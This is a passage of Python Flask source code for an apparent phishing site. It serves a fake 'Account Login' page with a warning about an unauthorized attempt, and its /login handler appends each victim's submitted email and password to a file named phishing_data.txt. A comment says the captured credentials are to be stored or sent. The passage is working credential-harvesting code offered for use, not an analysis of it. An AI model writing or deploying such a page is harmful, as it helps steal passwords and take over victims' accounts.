                    color: red;
                    margin-bottom: 1rem;
                    text-align: center;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Account Login</h1>
                <form action="/login" method="post">
                    <input type="email" name="username" placeholder="Enter your email" required>
                    <input type="password" name="password" placeholder="Enter your password" required>
                    <button type="submit">Sign In</button>
                </form>
                <div class="error">If you didn't expect this email, it's possible an unauthorized attempt was made.</div>
                </div>
            </div>
        </body>
    </html>
    '''

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    # Store or send the captured credentials
    with open('phishing_data.txt', 'a') as f:
        f.write(f"Username: {username}\nPassword: {password}\n")
